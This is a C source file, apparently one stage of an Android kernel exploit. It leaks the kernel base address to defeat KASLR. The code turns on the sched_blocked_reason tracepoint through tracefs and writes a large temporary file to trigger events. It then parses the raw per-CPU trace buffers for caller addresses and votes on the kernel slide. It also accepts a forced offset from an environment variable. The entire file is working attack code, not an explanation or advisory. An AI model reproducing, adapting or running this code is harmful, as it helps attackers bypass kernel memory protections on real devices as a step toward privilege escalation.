#include "common.h"

#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
#ifndef SLIDE_TRACEFS_EVENT_ID
#define SLIDE_TRACEFS_EVENT_ID 109
#endif

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

#define SLIDE_TRACEFS_CANDIDATE_SLOTS 32
#ifndef SLIDE_TRACEFS_WORKER_CALLER_OFF2
#define SLIDE_TRACEFS_WORKER_CALLER_OFF2 SLIDE_TRACEFS_WORKER_CALLER_OFF
#endif
#ifndef SLIDE_TRACEFS_WORKER_CALLER_OFF3
#define SLIDE_TRACEFS_WORKER_CALLER_OFF3 SLIDE_TRACEFS_WORKER_CALLER_OFF
#endif

static void slide_tracefs_vote_caller(
    uint64_t caller, uint64_t link_caller, unsigned *votes) {
  if (caller >= link_caller) {
    uint64_t cand = caller - link_caller;
    if (cand <= 0x1f0000ULL && (cand & 0xffffULL) == 0) {
      unsigned idx = (unsigned)(cand >> 16);
      if (idx < SLIDE_TRACEFS_CANDIDATE_SLOTS) {
        votes[idx]++;
      }
    }
  }
}
#ifndef SLIDE_TRACEFS_MIN_VOTES
#define SLIDE_TRACEFS_MIN_VOTES 3
#endif

static void slide_tracefs_count_page(
    const unsigned char *page, size_t page_len, unsigned *votes) {
  if (page_len < 20) {
    return;
  }

  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    end = page_len;
  }

  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29) {
      break;
    }

    size_t record_len = (size_t)type_len * 4;
    size_t record = pos + 4;
    if (record + record_len > end) {
      break;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));
      uint64_t link0 = KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
      uint64_t link1 = KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF2;
      uint64_t link2 = KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF3;
      slide_tracefs_vote_caller(caller, link0, votes);
      if (link1 != link0) {
        slide_tracefs_vote_caller(caller, link1, votes);
      }
      if (link2 != link0 && link2 != link1) {
        slide_tracefs_vote_caller(caller, link2, votes);
      }
    }
    pos = record + record_len;
  }
}

static int slide_tracefs_trigger(void) {
  char path[96];
  snprintf(path, sizeof(path), "/data/local/tmp/.s23-trace-io-%d", getpid());
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) {
    pr_error("slide tracefs trigger open failed errno=%d\n", errno);
    return 0;
  }
  size_t chunk_size = 0x40000;
  unsigned char *chunk = calloc(1, chunk_size);
  if (!chunk) {
    int saved_errno = errno;
    close(fd);
    unlink(path);
    errno = saved_errno;
    pr_error("slide tracefs trigger alloc failed errno=%d\n", errno);
    return 0;
  }
  int ok = 1;
  for (int round = 0; round < 16 && ok; round++) {
    size_t done = 0;
    while (done < chunk_size) {
      ssize_t wrote = write(fd, chunk + done, chunk_size - done);
      if (wrote < 0 && errno == EINTR) {
        continue;
      }
      if (wrote <= 0) {
        ok = 0;
        break;
      }
      done += (size_t)wrote;
    }
  }
  free(chunk);
  if (ok && fsync(fd) != 0) {
    ok = 0;
  }
  int saved_errno = errno;
  close(fd);
  unlink(path);
  errno = saved_errno;
  if (!ok) {
    pr_error("slide tracefs trigger write failed errno=%d\n", errno);
    return 0;
  }
  pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
  return 1;
}

static int slide_tracefs_leak_kernel_base(void) {
  static const char tracing_on[] =
      SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char trace[] =
      SLIDE_TRACEFS_ROOT "/trace";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";

  if (!slide_tracefs_write(tracing_on, "0")) {
    pr_error("slide tracefs setup failed errno=%d\n", errno);
    return 0;
  }

  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (trace_fd >= 0) {
    close(trace_fd);
  }
  if (!slide_tracefs_write(event_enable, "1") ||
      !slide_tracefs_write(tracing_on, "1")) {
    pr_error("slide tracefs setup failed errno=%d\n", errno);
    return 0;
  }
  if (!slide_tracefs_trigger()) {
    slide_tracefs_write(tracing_on, "0");
    slide_tracefs_write(event_enable, "0");
    return 0;
  }
  sleep(1);
  slide_tracefs_write(tracing_on, "0");

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  if (cpu_count <= 0 || cpu_count > 256) {
    pr_error("slide tracefs bad cpu count=%d\n", cpu_count);
    slide_tracefs_write(event_enable, "0");
    return 0;
  }
  unsigned votes[SLIDE_TRACEFS_CANDIDATE_SLOTS] = {0};
  int scan_errors = 0;
  for (int cpu = 0; cpu < cpu_count; cpu++) {
    char path[128];
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      scan_errors++;
      continue;
    }
    unsigned char page[4096];
    ssize_t got;
    while ((got = read(fd, page, sizeof(page))) != 0) {
      if (got > 0) {
        slide_tracefs_count_page(page, (size_t)got, votes);
        continue;
      }
      if (errno == EINTR) {
        continue;
      }
      if (errno != EAGAIN) {
        scan_errors++;
      }
      break;
    }
    close(fd);
  }
  slide_tracefs_write(event_enable, "0");
  unsigned best = 0;
  unsigned second = 0;
  for (unsigned i = 1; i < SLIDE_TRACEFS_CANDIDATE_SLOTS; i++) {
    if (votes[i] > votes[best]) {
      second = votes[best];
      best = i;
    } else if (votes[i] > second) {
      second = votes[i];
    }
  }
  if (votes[best] < SLIDE_TRACEFS_MIN_VOTES) {
    pr_error("slide tracefs worker caller not found best=%u votes=%u need=%d errors=%d\n",
             best, votes[best], SLIDE_TRACEFS_MIN_VOTES, scan_errors);
    return 0;
  }
  if (votes[best] == second) {
    pr_error("slide tracefs vote tie best=%u votes=%u second=%u errors=%d\n",
             best, votes[best], second, scan_errors);
    return 0;
  }
  uintptr_t candidate = (uintptr_t)best << 16;

  slide_p0_offset = candidate;
  kaslr_base = KIMAGE_TEXT_BASE + candidate;
  kaslr_slide = candidate;
  kaslr_done = 1;
  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
             "slide=%016llx p0_offset=%08zx\n",
             getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide, slide_p0_offset);
  return 1;
}

int slide_leak_kernel_base(void) {
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    slide_p0_offset = (uintptr_t)value;
    kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
    kaslr_slide = slide_p0_offset;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok source=forced pid=%d base=%016llx "
               "slide=%016llx p0_offset=%08zx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide, slide_p0_offset);
    return 1;
  }
  return slide_tracefs_leak_kernel_base();
}
